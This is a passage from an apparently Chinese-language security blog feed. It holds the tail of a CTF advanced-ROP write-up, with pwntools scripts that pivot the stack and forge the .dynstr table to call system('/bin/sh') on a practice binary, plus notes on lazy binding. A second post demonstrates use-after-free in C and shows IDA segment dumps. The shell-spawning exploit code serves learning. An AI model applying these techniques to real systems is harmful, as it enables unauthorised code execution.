payload_7)) </span><br><span class="line">    payload_7 += <span class="string">&quot;/bin/sh\x00&quot;</span>  </span><br><span class="line">    payload_7 += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">100</span>-<span class="built_in">len</span>(payload_7))</span><br><span class="line">    io.sendline(payload_7)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    stack_pivot ()</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 个人exp1 #--------------------------长串payload做法----------------------------#</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ydm1804&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ydm1804&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># copy dynstr表并将read字符串改为system字符串</span></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">&quot;read&quot;</span>,<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">ppp_addr = <span class="number">0x08048629</span>   <span class="comment"># pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 长串payload，注意栈上数据排布</span></span><br><span class="line">payload  = <span class="number">112</span>*<span class="string">&quot;a&quot;</span></span><br><span class="line">payload += p32(<span class="number">0x08048370</span>)   <span class="comment"># read@plt 修改dynstr表的地址为bss段起始地址,达到劫持dynstr表的目的</span></span><br><span class="line">payload += p32(<span class="number">0x08048629</span>) + p32(<span class="number">0x0</span>) + p32(<span class="number">0x08049804</span>+<span class="number">4</span>) + p32(<span class="number">0x4</span>) </span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0x08048370</span>)   <span class="comment"># read@plt 将dynstr表中的read替换为system,并写入bss段</span></span><br><span class="line">payload += p32(<span class="number">0x08048629</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x080498E0</span>) + p32(<span class="built_in">len</span>(dynstr))</span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0x08048370</span>)   <span class="comment"># read@plt 将system()的参数/bin/sh写入bss段</span></span><br><span class="line">payload += p32(<span class="number">0x08048629</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x080498E0</span> + <span class="number">0x100</span>) + p32(<span class="built_in">len</span>(<span class="string">&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0x08048376</span>)   <span class="comment"># read@plt 2 触发动态链接,调用我们重构的dynstr表,调用system()</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x080498E0</span> + <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(p32(<span class="number">0x080498E0</span>))</span><br><span class="line">io.send(dynstr)</span><br><span class="line">io.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3、知识点："><a href="#3、知识点：" class="headerlink" title="3、知识点："></a>3、知识点：</h4><p>动态链接的过程要了解</p><p>（1）第一次调用libc中的函数时，整个过程大致以下几步</p><p><img src="1.jpeg" alt="img"></p><p><strong>参考链接：</strong><a href="https://www.anquanke.com/post/id/184099">ret2dl_resolve解析 - 安全客，安全资讯平台</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#程序先从第一个参数link_map获取字符串表.dynstr、符号表.dynsym以及重定位表.rel.plt的地址，</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过第二个参数n即.rel.plt表中的偏移reloc_arg加上.rel.plt的地址获取函数对应的重定位结构的位置，从而获取函数对应的r_offset以及在符号表中的下标r_info&gt;&gt;8。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#根据符号表地址以及下标获取符号结构体，获得了函数符号表中的st_name，即函数名相对于字符串表.dynstr的偏移。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#最后可得到函数名的字符串，然后去libc中匹配函数名，找到相应的函数并将地址填回到r_offset即函数got表中，延迟绑定完成。</span></span><br></pre></td></tr></table></figure><p>plt第二行压入偏移值 reloc_arg</p><p>got + 4 存入link_map地址</p><p>got + 8 存储 _dl_runtime_resolve 函数的地址</p><p>调用 _dl_runtime_resolve 函数的过程中会执行 _dl_fixup 函数，该函数会将偏移值与link_map作为参数，并且执行该函数时会获取 dynstr表地址、dynsym表地址、rel.plt表地址……<strong>(ctf竞赛权威指南P214)</strong></p><p>之后在libc中查找函数是通过dynstr表中的字符串比对来查找函数的</p><p>（2）第二次及第二次以后：</p><p><img src="2.jpeg" alt="img"></p><h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3>]]></content>
    
    
    <summary type="html">ctfwiki-高级ROP</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>C代码</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/08/11/%E6%B1%87%E7%BC%96%E8%A7%92%E5%BA%A6%E7%90%86%E8%A7%A3C%E4%BB%A3%E7%A0%81/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/08/11/%E6%B1%87%E7%BC%96%E8%A7%92%E5%BA%A6%E7%90%86%E8%A7%A3C%E4%BB%A3%E7%A0%81/</id>
    <published>2022-08-11T03:45:37.000Z</published>
    <updated>2022-08-26T04:26:02.016Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 随笔，想啥写啥，遇见啥选择性收录啥 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br></pre></td></tr></table></figure><br/><h3 id="one"><a href="#one" class="headerlink" title="one"></a>one</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;func1\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hack\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Pfunc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> (*p)();</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Pfunc</span>* <span class="title">lpfunc</span> =</span> <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">    lpfunc-&gt;p = func1;</span><br><span class="line">    lpfunc-&gt;p();</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(lpfunc);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">long</span>* hack_point = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">    *hack_point = hack;</span><br><span class="line"> </span><br><span class="line">    lpfunc-&gt;p();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//gcc -g -m32 test.c</span></span><br></pre></td></tr></table></figure><h3 id="two"><a href="#two" class="headerlink" title="two"></a>two</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//#define NULL 0  //redefine</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xy 666;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">a</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 经ida反编译查看bss段： ib、ie、ii、ia、sc、sa、il、id  </span></span><br><span class="line"><span class="comment">// data段：ic、i_f、ig、ih、im、io</span></span><br><span class="line"><span class="comment">// text段：a、main、ij、aaa、in</span></span><br><span class="line"><span class="comment">// 失踪：*ik、</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ia;      <span class="comment">//未赋值变量，存在bss段 </span></span><br><span class="line"><span class="keyword">int</span> ib = <span class="number">0</span>;  <span class="comment">//赋值为0，存在 bss段 ？ -------------------- </span></span><br><span class="line"><span class="keyword">int</span> ic = <span class="number">1</span>;  <span class="comment">//赋值变量， 数据，存在data段</span></span><br><span class="line"><span class="keyword">int</span> id[<span class="number">10</span>];  <span class="comment">//未赋值数组，存在 bss段 ？------------------ </span></span><br><span class="line"><span class="keyword">int</span> ie[]  = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;    <span class="comment">//赋值为0，存在 bss段 ？ --------------------</span></span><br><span class="line"><span class="keyword">int</span> i_f[] = &#123;<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>&#125;; <span class="comment">//赋值数组变量，</span></span><br><span class="line"><span class="keyword">int</span> *ig = id + <span class="number">1</span>;     <span class="comment">//指向未赋值数组  ，存在 bss段？------------- </span></span><br><span class="line"><span class="keyword">int</span> *ih = i_f;       <span class="comment">//指向赋值数组   </span></span><br><span class="line"><span class="keyword">int</span> *ii = <span class="literal">NULL</span>;      <span class="comment">//空指针，存在bss段？</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> (ij)();  <span class="comment">//名为 (ij) 的函数 ，后面有定义，可执行，存在text段</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">ik</span><span class="params">()</span></span>;   <span class="comment">//名为 *ik 的函数 ，后面无定义，存在 bss 段？ </span></span><br><span class="line"><span class="keyword">int</span> (*il)(); <span class="comment">//名为 il 的函数指针 ，所以为了区分函数与函数指针，函数指针变量的外面要套一层 ()   </span></span><br><span class="line"><span class="comment">//void ik() = a();</span></span><br><span class="line"><span class="keyword">int</span> (* im)() = a;  <span class="comment">//名为 im 的函数指针 ，有赋值，存在哪？</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">in</span><span class="params">()</span></span>;  <span class="comment">// 名为 *in 的函数 </span></span><br><span class="line"><span class="keyword">int</span> (* io)() = (ij);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ia = ib;     //不放在函数里面会报错 </span></span><br><span class="line"><span class="comment">//*ik() = a();  //不放在函数里面会报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">struct Pfunc</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int (*p)();</span></span><br><span class="line"><span class="comment">&#125;sa,sb*,sc[]; */</span><span class="comment">//sb* 加入会报错  ，自己体会 </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Pfunc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> (*p)();</span><br><span class="line">&#125;sa,sc[<span class="number">10</span>]; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">aaa</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//*ik() = a();   // 理想：函数 a() 地址赋给 函数 *ik()   现实：error </span></span><br><span class="line">ia = ib;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ma = <span class="number">10</span>;  <span class="comment">//函数内部变量，存在栈上</span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Pfunc</span>* <span class="title">lpfunc</span>;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//lpfunc-&gt;p = aaa;  //理想：pc指针指向这，执行代码将 *ik 函数地址赋值给 p   现实：估计触发了安全检测机制 ，程序到这就停了，没有达到想要的结果 </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2\n&quot;</span>);</span><br><span class="line"><span class="comment">//lpfunc-&gt;p();      //pc指针执行到这时，执行lpfunc结构体的 p() 函数指针参数 ，最后一步步指向把 a()函数执行了   现实：同上 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;3\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//ma = aaa();</span></span><br><span class="line">a(); </span><br><span class="line">(* im)();</span><br><span class="line">aaa();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    char mb;</span></span><br><span class="line"><span class="comment">    char *md =&quot;this is rodata.&quot;;</span></span><br><span class="line"><span class="comment">    char mc[]=&quot;this is stack.&quot;;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    printf(&quot;\n d = %s , &amp;d = %x&quot;,md,&amp;md);</span></span><br><span class="line"><span class="comment">    printf(&quot;\n&amp;c = 0x%x , c = %s , c = %d&quot;,&amp;mc,mc,mc);</span></span><br><span class="line"><span class="comment">    **/</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">aaa</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n I&#x27;m func aaa() ^_^ \n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">a</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n I&#x27;m func a() ^_^ \n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> (ij)()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n I&#x27;m (ij)() func \n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">in</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n I&#x27;m *in() func :) \n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc -o yj1 yj1.c -fno-stack-protector -no-pie</span></span><br></pre></td></tr></table></figure><br/><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#bss段： ib、ie、ii、ia、sc、sa、il、id 、unk_404144（不知道是个啥）</span><br><span class="line">.bss:0000000000404080 ; ===========================================================================</span><br><span class="line">.bss:0000000000404080</span><br><span class="line">.bss:0000000000404080 ; Segment type: Uninitialized</span><br><span class="line">.bss:0000000000404080 ; Segment permissions: Read/Write</span><br><span class="line">.bss:0000000000404080 _bss            segment align_32 public &#x27;BSS&#x27; use64</span><br><span class="line">.bss:0000000000404080                 assume cs:_bss</span><br><span class="line">.bss:0000000000404080                 ;org 404080h</span><br><span class="line">.bss:0000000000404080                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing</span><br><span class="line">.bss:0000000000404080 completed_8061  db ?                    ; DATA XREF: __do_global_dtors_aux+4↑r</span><br><span class="line">.bss:0000000000404080                                         ; __do_global_dtors_aux+16↑w</span><br><span class="line">.bss:0000000000404081                 align 8</span><br><span class="line">.bss:0000000000404088                 public ib</span><br><span class="line">.bss:0000000000404088 ib              dd ?                    ; DATA XREF: main+C↑r</span><br><span class="line">.bss:000000000040408C                 align 10h</span><br><span class="line">.bss:0000000000404090                 public ie</span><br><span class="line">.bss:0000000000404090 ie              db    ? ;</span><br><span class="line">........</span><br><span class="line">.bss:00000000004040A0                 public ii</span><br><span class="line">.bss:00000000004040A0 ii              db    ? ;</span><br><span class="line">........</span><br><span class="line">.bss:00000000004040C0                 public ia</span><br><span class="line">.bss:00000000004040C0 ia              dd ?                    ; DATA XREF: main+12↑w</span><br><span class="line">.bss:00000000004040C4                 align 20h</span><br><span class="line">.bss:00000000004040E0                 public sc</span><br><span class="line">.bss:00000000004040E0 sc              db    ? ;</span><br><span class="line">.bss:00000000004040E1                 db    ? ;</span><br><span class="line">........</span><br><span class="line">.bss:0000000000404130 sa              db    ? ;</span><br><span class="line">........</span><br><span class="line">.bss:0000000000404138 il              db    ? ;</span><br><span class="line">........             </span><br><span class="line">.bss:0000000000404140                 public id</span><br><span class="line">.bss:0000000000404140 id              db    ? ;</span><br><span class="line">.bss:0000000000404141                 db    ? ;</span><br><span class="line">.bss:0000000000404142                 db    ? ;</span><br><span class="line">.bss:0000000000404143                 db    ? ;</span><br><span class="line">.bss:0000000000404144 unk_404144      db    ? ;               ; DATA XREF: .data:ig↑o</span><br><span class="line">.bss:0000000000404145                 db    ? ;</span><br><span class="line">.bss:0000000000404146                 db    ? ;</span><br><span class="line">........</span><br><span class="line">.bss:0000000000404167                 db    ? ;</span><br><span class="line">.bss:0000000000404167 _bss            ends</span><br><span class="line">.bss:0000000000404167</span><br></pre></td></tr></table></figure><br/><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#data段：ic、i_f、ig、ih、im、io</span><br><span class="line">.data:0000000000404020 ; ===========================================================================</span><br><span class="line">.data:0000000000404020</span><br><span class="line">.data:0000000000404020 ; Segment type: Pure data</span><br><span class="line">.data:0000000000404020 ; Segment permissions: Read/Write</span><br><span class="line">.data:0000000000404020 _data           segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">.data:0000000000404020                 assume cs:_data</span><br><span class="line">.data:0000000000404020                 ;org 404020h</span><br><span class="line">.data:0000000000404020                 public __data_start ; weak</span><br><span class="line">.data:0000000000404020 __data_start    db    0                 ; Alternative name is &#x27;__data_start&#x27;</span><br><span class="line">.data:0000000000404020                                         ; data_start</span><br><span class="line">......</span><br><span class="line">.data:0000000000404028                 public __dso_handle</span><br><span class="line">.data:0000000000404028 __dso_handle    db    0</span><br><span class="line">.data:0000000000404029                 db    0</span><br><span class="line">......</span><br><span class="line">.data:0000000000404030                 public ic</span><br><span class="line">.data:0000000000404030 ic              db    1</span><br><span class="line">.data:0000000000404031                 db    0</span><br><span class="line">......</span><br><span class="line">.data:0000000000404038                 public i_f</span><br><span class="line">.data:0000000000404038 i_f             db  0Ch                 ; DATA XREF: .data:ih↓o</span><br><span class="line">.data:0000000000404039                 db    0</span><br><span class="line">......</span><br><span class="line">.data:0000000000404048                 public ig</span><br><span class="line">.data:0000000000404048 ig              dq offset unk_404144</span><br><span class="line">.data:0000000000404050                 public ih</span><br><span class="line">.data:0000000000404050 ih              dq offset i_f</span><br><span class="line">.data:0000000000404058                 public im</span><br><span class="line">.data:0000000000404058 ; __int64 (*im)(void)</span><br><span class="line">.data:0000000000404058 im              dq offset a             ; DATA XREF: main+4D↑r</span><br><span class="line">.data:0000000000404060                 public io</span><br><span class="line">.data:0000000000404060 io              dq offset ij</span><br><span class="line">.data:0000000000404060 _data           ends</span><br><span class="line">.data:0000000000404060</span><br><span class="line"></span><br></pre></td></tr></table></figure><br/><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#rodata:存字符串的</span><br><span class="line">.rodata:0000000000402000 ; ===========================================================================</span><br><span class="line">.rodata:0000000000402000</span><br><span class="line">.rodata:0000000000402000 ; Segment type: Pure data</span><br><span class="line">.rodata:0000000000402000 ; Segment permissions: Read</span><br><span class="line">.rodata:0000000000402000 _rodata         segment dword public &#x27;CONST&#x27; use64</span><br><span class="line">.rodata:0000000000402000                 assume cs:_rodata</span><br><span class="line">.rodata:0000000000402000                 ;org 402000h</span><br><span class="line">.rodata:0000000000402000                 public _IO_stdin_used</span><br><span class="line">.rodata:0000000000402000 _IO_stdin_used  db    1                 ; DATA XREF: LOAD:0000000000400130↑o</span><br><span class="line">.rodata:0000000000402001                 db    0</span><br><span class="line">.rodata:0000000000402002                 db    2</span><br><span class="line">.rodata:0000000000402003                 db    0</span><br><span class="line">.rodata:0000000000402004 ; const char s[]</span><br><span class="line">.rodata:0000000000402004 s:                                      ; DATA XREF: main+1F↑o</span><br><span class="line">.rodata:0000000000402004                                         ; main+2B↑o ...</span><br><span class="line">.rodata:0000000000402004                 text &quot;UTF-16LE&quot;, &#x27;123&#x27;</span><br><span class="line">.rodata:000000000040200A ; const char aIMFuncAaa[]</span><br><span class="line">.rodata:000000000040200A aIMFuncAaa      db 0Ah                  ; DATA XREF: aaa+8↑o</span><br><span class="line">.rodata:000000000040200A                 db &#x27; I&#x27;,27h,&#x27;m func aaa() ^_^ &#x27;,0</span><br><span class="line">.rodata:0000000000402020 ; const char aIMFuncA[]</span><br><span class="line">.rodata:0000000000402020 aIMFuncA        db 0Ah                  ; DATA XREF: a+8↑o</span><br><span class="line">.rodata:0000000000402020                 db &#x27; I&#x27;,27h,&#x27;m func a() ^_^ &#x27;,0</span><br><span class="line">.rodata:0000000000402034 ; const char aIMIjFunc[]</span><br><span class="line">.rodata:0000000000402034 aIMIjFunc       db 0Ah                  ; DATA XREF: ij+8↑o</span><br><span class="line">.rodata:0000000000402034                 db &#x27; I&#x27;,27h,&#x27;m (ij)() func 